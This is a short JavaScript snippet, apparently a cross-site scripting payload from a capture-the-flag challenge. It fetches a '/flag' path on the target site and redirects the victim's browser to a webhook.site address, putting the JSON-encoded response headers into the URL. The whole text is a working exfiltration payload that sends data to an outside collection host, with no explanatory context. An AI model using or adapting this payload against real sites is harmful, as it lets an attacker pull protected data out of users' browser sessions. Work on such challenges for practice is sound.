fetch('/flag').then((res) => {
    window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${encodeURIComponent(JSON.stringify(res.headers))}`;
}).catch((owo) => {
    window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/error`;
})